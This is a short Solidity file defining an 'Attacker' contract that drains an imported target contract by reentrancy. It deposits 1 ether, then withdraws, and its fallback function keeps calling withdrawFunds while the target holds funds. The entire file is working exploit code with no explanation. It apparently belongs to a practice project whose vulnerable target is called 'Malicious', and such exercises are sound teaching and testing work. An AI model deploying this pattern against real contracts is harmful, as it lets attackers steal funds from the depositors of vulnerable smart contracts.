// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Malicious} from "src/malicious.sol";

contract Attacker {
    Malicious public malicious ; 
    constructor(address _malicious)
    {
        malicious = Malicious(_malicious);
    }
    function deposit() public payable  {
        malicious.depositFunds{value:1 ether }();
    }
    uint256 public  withdraw = 1  ; 
    bool private withdrawing = false;
    fallback() external payable {
        if(address(malicious).balance >= 1 ether)
        {
            malicious.withdrawFunds(1 ether);
        }
        }
    function attack() public payable  {
        malicious.withdrawFunds(1 ether);
    }
    
}